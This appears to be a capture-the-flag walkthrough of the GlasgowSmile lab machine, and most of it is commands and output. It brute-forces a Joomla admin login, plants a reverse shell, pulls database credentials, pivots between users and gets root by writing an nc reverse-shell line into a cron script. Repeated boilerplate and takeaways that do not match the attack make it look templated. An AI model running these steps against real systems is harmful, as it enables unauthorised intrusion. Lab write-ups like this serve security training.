## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web-based initial access |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,js,txt -e -E --scan-dir-listings -u http://$ip
```

```bash
✅[1:51][CPU:7][MEM:76][TUN0:192.168.45.180][/home/n0z0]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,js,txt -e -E --scan-dir-listings -u http://$ip


 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.104.79
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 301, 302, 401, 403]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 💲  Extensions            │ [php, html, js, txt]
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      280l     1770w   149309c http://192.168.104.79/joker.jpg
200      GET        8l       11w      125c http://192.168.104.79/
200      GET      226l      718w     9992c http://192.168.104.79/joomla/

```

http://192.168.104.79/joomla/index.php

*Caption: Screenshot captured during this stage of the assessment.*

http://192.168.104.79/joomla/administrator/index.php

*Caption: Screenshot captured during this stage of the assessment.*

`joomscan -u http://192.168.104.79/joomla/ -ec -r`
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.104.79/joomla/ ...


[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.104.79/joomla/administrator/components
http://192.168.104.79/joomla/administrator/modules
http://192.168.104.79/joomla/administrator/templates
http://192.168.104.79/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.104.79/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.104.79/joomla/robots.txt

Interesting path found from robots.txt
http://192.168.104.79/joomla/joomla/administrator/
http://192.168.104.79/joomla/administrator/
http://192.168.104.79/joomla/bin/
http://192.168.104.79/joomla/cache/
http://192.168.104.79/joomla/cli/
http://192.168.104.79/joomla/components/
http://192.168.104.79/joomla/includes/
http://192.168.104.79/joomla/installation/
http://192.168.104.79/joomla/language/
http://192.168.104.79/joomla/layouts/
http://192.168.104.79/joomla/libraries/
http://192.168.104.79/joomla/logs/
http://192.168.104.79/joomla/modules/
http://192.168.104.79/joomla/plugins/
http://192.168.104.79/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

[+] Enumeration component (com_ajax)
[++] Name: com_ajax
Location : http://192.168.104.79/joomla/components/com_ajax/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_ajax/


[+] Enumeration component (com_banners)
[++] Name: com_banners
Location : http://192.168.104.79/joomla/components/com_banners/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_banners/


[+] Enumeration component (com_contact)
[++] Name: com_contact
Location : http://192.168.104.79/joomla/components/com_contact/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_contact/


[+] Enumeration component (com_content)
[++] Name: com_content
Location : http://192.168.104.79/joomla/components/com_content/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_content/


[+] Enumeration component (com_contenthistory)
[++] Name: com_contenthistory
Location : http://192.168.104.79/joomla/components/com_contenthistory/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_contenthistory/


[+] Enumeration component (com_fields)
[++] Name: com_fields
Location : http://192.168.104.79/joomla/components/com_fields/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_fields/


[+] Enumeration component (com_finder)
[++] Name: com_finder
Location : http://192.168.104.79/joomla/components/com_finder/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_finder/


[+] Enumeration component (com_mailto)
[++] Name: com_mailto
Location : http://192.168.104.79/joomla/components/com_mailto/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_mailto/
Installed version : 3.1


[+] Enumeration component (com_media)
[++] Name: com_media
Location : http://192.168.104.79/joomla/components/com_media/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_media/


[+] Enumeration component (com_newsfeeds)
[++] Name: com_newsfeeds
Location : http://192.168.104.79/joomla/components/com_newsfeeds/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_newsfeeds/


[+] Enumeration component (com_search)
[++] Name: com_search
Location : http://192.168.104.79/joomla/components/com_search/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_search/


[+] Enumeration component (com_users)
[++] Name: com_users
Location : http://192.168.104.79/joomla/components/com_users/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_users/


[+] Enumeration component (com_wrapper)
[++] Name: com_wrapper
Location : http://192.168.104.79/joomla/components/com_wrapper/
Directory listing is enabled : http://192.168.104.79/joomla/components/com_wrapper/
Installed version : 3.1


Your Report : reports/192.168.104.79/


```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cewl http://$ip/joomla/administrator/ -d 4 -m 5 -w cewl2.txt
```

```bash
✅[23:25][CPU:23][MEM:72][TUN0:192.168.45.180][...oving_Ground/GlasgowSmile]
🐉 > cewl http://$ip/joomla/administrator/ -d 4 -m 5 -w cewl2.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

- -d 4-> means depth to spider to , more depth returns better results,default is 2  
- -m -> maximum word count  
- -w -> write output to  
- --url -> target url
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=cewl2.txt,http-joomla-brute.threads=3,http-joomla-brute.uri=/joomla/administrator/index.php,brute.firstonly=true' $ip
```

```bash
✅[23:51][CPU:6][MEM:63][TUN0:192.168.45.180][...oving_Ground/GlasgowSmile]
🐉 > nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=cewl2.txt,http-joomla-brute.threads=3,http-joomla-brute.uri=/joomla/administrator/index.php,brute.firstonly=true' $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 23:51 JST
Nmap scan report for 192.168.104.79
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-joomla-brute:
|   Accounts:
|     joomla:Gotham - Valid credentials
|     admin:enter - Valid credentials
|_  Statistics: Performed 128 guesses in 17 seconds, average tps: 7.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 452.89 seconds

```


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[2:34][CPU:5][MEM:72][TUN0:192.168.45.180][/tools]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.104.79] 53310
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 11:35:09 up  4:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (565): Inappropriate ioctl for device
bash: no job control in this shell
www-data@glasgowsmile:/$ 
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat local.txt
```

```bash
www-data@glasgowsmile:/home/rob$ cat local.txt
cat local.txt
85f06c9fcc65e506e0e901f7f1eb29b2
```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
./pspy64
```

```bash
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'


www-data@glasgowsmile:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/03 11:56:58 CMD: UID=105   PID=18471  | sshd: [net]
2026/02/03 11:56:58 CMD: UID=0     PID=18470  | sshd: [accepted]
2026/02/03 11:56:58 CMD: UID=33    PID=18463  | ./pspy64
2026/02/03 11:56:58 CMD: UID=105   PID=18462  | sshd: abner [net]
2026/02/03 11:56:58 CMD: UID=0     PID=18461  | sshd: abner [priv]
2026/02/03 11:56:58 CMD: UID=105   PID=18460  | sshd: abner [net]
2026/02/03 11:56:58 CMD: UID=0     PID=18459  | sshd: abner [priv]
2026/02/03 11:56:58 CMD: UID=105   PID=18458  | sshd: abner [net]
2026/02/03 11:56:58 CMD: UID=0     PID=18457  | sshd: abner [priv]
2026/02/03 11:57:01 CMD: UID=0     PID=18483  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18484  | /usr/sbin/CRON -f
2026/02/03 11:57:01 CMD: UID=0     PID=18485  | /usr/sbin/CRON -f
2026/02/03 11:57:01 CMD: UID=0     PID=18486  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
2026/02/03 11:57:01 CMD: UID=0     PID=18487  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18488  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18490  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18489  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18492  | sshd: [accepted]
2026/02/03 11:57:01 CMD: UID=0     PID=18491  | sshd: [accepted]
2026/02/03 11:57:03 CMD: UID=0     PID=18494  | sshd: [accepted]

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat configuration.php
```

```bash
www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php
cat configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'Joker';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'babyjoker';
	public $db = 'joomla_db';
	public $dbprefix = 'jnqcu_';

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
mysql -u joomla -p"babyjoker" -h 127.0.0.1 -P 3306
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
MariaDB [batjoke]> SELECT * FROM taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
echo 'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/' | base64 -d
```

```bash
✅[3:45][CPU:6][MEM:63][TUN0:192.168.45.180][...oving_Ground/GlasgowSmile]
🐉 > echo 'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/' | base64 -d
???AllIHaveAreNegativeThoughts??? 

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
ssh rob@$ip
```

```bash
❌[3:46][CPU:1][MEM:63][TUN0:192.168.45.180][/home/n0z0]
🐉 > ssh rob@$ip
rob@192.168.104.79's password:
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rob@glasgowsmile:~$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat Abnerineedyourhelp | tr ‘a-zA-Z’ ‘b-zaB-ZA’
echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA=='
echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==' | base64 -d
su abner
```

```bash
rob@glasgowsmile:~$ cat Abnerineedyourhelp | tr ‘a-zA-Z’ ‘b-zaB-ZA’
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
rob@glasgowsmile:~$ echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA=='
STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
rob@glasgowsmile:~$ echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==' | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
rob@glasgowsmile:~$ su abner
Password:
abner@glasgowsmile:/home/rob$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip .
unzip .dear_penguins.zip
ls -la
cat dear_penguins
```

```bash
abner@glasgowsmile:~$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip .
abner@glasgowsmile:~$ unzip .dear_penguins.zip
Archive:  .dear_penguins.zip
[.dear_penguins.zip] dear_penguins password:
  inflating: dear_penguins
abner@glasgowsmile:~$ ls -la
total 40
drwxr-xr-x 3 abner abner 4096 Feb  3 13:18 .
drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
-rw-r--r-- 1 abner abner  430 Jun 16  2020 dear_penguins
-rwxr-xr-x 1 abner abner  516 Feb  3 13:17 .dear_penguins.zip
-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
-rw-r----- 1 abner abner   32 Aug 25  2020 user2.txt
-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
abner@glasgowsmile:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
abner@glasgowsmile:~$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
id
```

```bash
Password:
penguin@glasgowsmile:~$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
penguin@glasgowsmile:~$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
ls -la
find . -exec /bin/sh -p \; -quit
id
exit
```

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 4 penguin penguin   4096 Aug 25  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ find . -exec /bin/sh -p \; -quit
$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
$ exit
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
echo 'nc 192.168.45.180 4445 -e /bin/bash'>.trash_old
```

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo 'nc 192.168.45.180 4445 -e /bin/bash'>.trash_old
```

Retrieved proof.txt:
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4445
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
id
cat proof.txt
```

```bash
❌[4:01][CPU:6][MEM:66][TUN0:192.168.45.180][...oving_Ground/GlasgowSmile]
🐉 > rlwrap -cAri nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.104.79] 55098
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
root@glasgowsmile:~# export TERM=xterm
root@glasgowsmile:~# script /dev/null -c bash
Script started, file is /dev/null
stty raw -echo && fg
root@glasgowsmile:~# stty raw -echo && fg
bash: fg: current: no such job
root@glasgowsmile:~# id
uid=0(root) gid=0(root) groups=0(root)
root@glasgowsmile:~# cat proof.txt
0340078ad68abfccf43a365dfb877be4
root@glasgowsmile:~#

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

### Attack Flow

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1: 偵察"]
        direction TB
        K1A[ポートスキャン]
        K1B[22/SSH, 80/HTTP]
        K1C[OpenSSH 7.9p1, Apache 2.4.38]
        K1D[Debian 10 Buster]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2: Web列挙"]
        direction TB
        K2A[feroxbuster実行]
        K2B[Joomla発見]
        K2C[JoomScan実行]
        K2D[Joomla 3.7.3rc1特定]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3: 認証情報探索"]
        direction TB
        K3A[cewlでワードリスト生成]
        K3B[パスワードリスト作成]
        K3C[ユーザーリスト作成]
        K3D[ブルートフォース準備]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4: Joomla侵害"]
        direction TB
        K4A[http-joomla-brute実行]
        K4B[joomla:Gotham発見]
        K4C[管理画面ログイン]
        K4D[テンプレート編集権限確認]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5: 初期侵入"]
        direction TB
        K5A[PHPリバースシェル準備]
        K5B[index.php編集]
        K5C[リバースシェル設置]
        K5D[ncリスナー起動]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6: www-dataシェル"]
        direction TB
        K6A[Joomlaページアクセス]
        K6B[www-dataシェル確立]
        K6C[local.txt取得]
        K6D[LinPEAS転送]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7: DB列挙"]
        direction TB
        K7A[configuration.php発見]
        K7B[MySQL接続]
        K7C[batjoke DB発見]
        K7D[Base64ハッシュ取得]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8: robアカウント"]
        direction TB
        K8A[robパスワードハッシュ]
        K8B[Base64デコード]
        K8C[AllIHaveAreNegativeThoughts]
        K8D[SSH接続成功]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9: abnerアカウント"]
        direction TB
        K9A[Abnerineedyourhelp発見]
        K9B[ROT13復号化]
        K9C[Base64パスワード]
        K9D[I33hope99my0death]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    subgraph KC10["Kill Chain 10: penguinアカウント"]
        direction TB
        K10A[dear_penguins.zip発見]
        K10B[zipファイルコピー]
        K10C[パスワードで解凍]
        K10D[penguin認証情報取得]
        
        K10A --> K10B --> K10C --> K10D
    end
    
    subgraph KC11["Kill Chain 11: 権限昇格準備"]
        direction TB
        K11A[pspy64実行]
        K11B[cronジョブ発見]
        K11C[trash_old権限確認]
        K11D[書き込み権限あり]
        
        K11A --> K11B --> K11C --> K11D
    end
    
    subgraph KC12["Kill Chain 12: root取得"]
        direction TB
        K12A[リバースシェル書き込み]
        K12B[ncリスナー起動]
        K12C[cron実行待機]
        K12D[rootシェル取得]
        
        K12A --> K12B --> K12C --> K12D
    end
    
    subgraph KC13["Kill Chain 13: 目標達成"]
        direction TB
        K13A[rootシェル確立]
        K13B[proof.txt取得]
        K13C[フラグ確認]
        K13D[完了]
        
        K13A --> K13B --> K13C --> K13D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9 ==> KC10 ==> KC11 ==> KC12 ==> KC13
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#ffe0b2
    style KC8 fill:#d1c4e9
    style KC9 fill:#c5cae9
    style KC10 fill:#bbdefb
    style KC11 fill:#b3e5fc
    style KC12 fill:#ff9800
    style KC13 fill:#4caf50
    style K12D fill:#ff6b6b,color:#fff
    style K13D fill:#2196f3,color:#fff
```

## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
